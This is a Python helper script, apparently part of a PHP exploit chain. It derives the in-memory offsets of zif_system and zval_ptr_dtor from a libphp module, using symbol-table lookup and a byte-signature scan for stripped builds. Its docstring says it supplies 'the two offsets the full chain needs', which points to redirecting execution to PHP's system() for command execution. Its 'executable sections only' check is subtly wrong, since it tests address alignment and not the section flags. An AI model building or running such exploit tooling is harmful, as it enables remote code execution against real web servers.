#!/usr/bin/env python3
"""offsets.py - derive the two offsets the full chain needs from a libphp module.

zif_system is static. Two routes:

1. signature (works on stripped distro builds): zif_system is a 10-byte stub
   `mov $1,%edx; jmp php_exec_ex` and zif_passthru is the same with `$3`, so the
   pair with an identical jump target identifies php_exec_ex users. zif_system
   is the `$1` one.
2. symbol table (docker-php images keep .symtab).

zval_ptr_dtor is exported and comes straight from the symtab.

Usage: python3 offsets.py /path/to/libphp.so
"""
import re
import struct
import subprocess
import sys


def symtab(path):
    out = subprocess.run(["readelf", "-sW", path], capture_output=True, text=True).stdout
    names = {}
    for line in out.splitlines():
        p = line.split()
        if len(p) >= 8 and p[3] == "FUNC":
            names[p[-1]] = int(p[1], 16)
    return names


def sections(path):
    out = subprocess.run(["readelf", "-SW", path], capture_output=True, text=True).stdout
    secs = []
    for line in out.splitlines():
        m = re.match(r"\s*\[\s*\d+\]\s+(\S+)\s+(\S+)\s+([0-9a-f]+)\s+([0-9a-f]+)\s+([0-9a-f]+)", line)
        if m:
            secs.append((m.group(1), m.group(2), int(m.group(3), 16), int(m.group(4), 16), int(m.group(5), 16)))
    return secs


def stubs(data, secs):
    """Return {target: [(addr, n)]} for `mov $n,%edx; jmp target` stubs."""
    found = {}
    for _n, typ, addr, off, size in secs:
        if typ != "PROGBITS" or not (addr & 0xFFF):
            continue                      # executable sections only
        blob = data[off:off + size]
        for m in re.finditer(rb"\xba([\x01-\x04])\x00\x00\x00\xe9(....)", blob):
            n = m.group(1)[0]
            rel = struct.unpack("<i", m.group(2))[0]
            src = addr + m.start()
            tgt = src + 10 + rel
            found.setdefault(tgt, []).append((src, n))
    return found


def main():
    path = sys.argv[1]
    data = open(path, "rb").read()
    secs = sections(path)
    syms = symtab(path)

    dtor = syms.get("zval_ptr_dtor", 0)
    zif = syms.get("zif_system", 0)

    if not zif:
        for _tgt, users in stubs(data, secs).items():
            nums = {n: a for a, n in users}
            if 1 in nums and 3 in nums:          # system + passthru on one target
                zif = nums[1]
                break

    print("zval_ptr_dtor=%s" % (hex(dtor) if dtor else "not exported"))
    print("zif_system=%s" % (hex(zif) if zif else "not found"))
    return 0 if (dtor and zif) else 1


if __name__ == "__main__":
    sys.exit(main())
